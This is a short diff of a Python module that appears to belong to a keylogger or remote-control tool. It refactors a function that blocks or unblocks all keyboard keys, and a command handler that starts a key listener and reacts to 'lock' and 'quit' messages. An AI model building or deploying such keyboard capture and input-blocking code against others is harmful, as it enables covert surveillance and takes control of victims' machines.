@@ -46,6 +46,15 @@ def lock():
         islock = 0
     return "The keyboard is unblock"
 
+def lock(islock):
+    if islock == 0:
+        for i in range(150):
+            keyboard.block_key(i)
+        return "The keyboard is block", 1
+    else:
+        for i in range(150):
+            keyboard.unblock_key(i)
+    return "The keyboard is unblock", 0
 
 def keylog(client):
     global cont, flag, islock, ishook
@@ -73,9 +82,8 @@ def keylog(client):
             return
     return
 
-def keylog(msg):
-    global cont, flag, islock, ishook
-    islock = 0
+def keylog(msg, islock):
+    global cont, flag, ishook
     ishook = 0
     threading.Thread(target=listen).start()
     flag = 0
@@ -90,8 +98,8 @@ def keylog(msg):
             flag = 2
             ishook = 0
     elif "lock" in msg:
-        msgRep = lock()
+        msgRep,islock = lock(islock)
     elif "quit" in msg:
         flag = 4
         return
-    return msgRep
+    return msgRep,islock
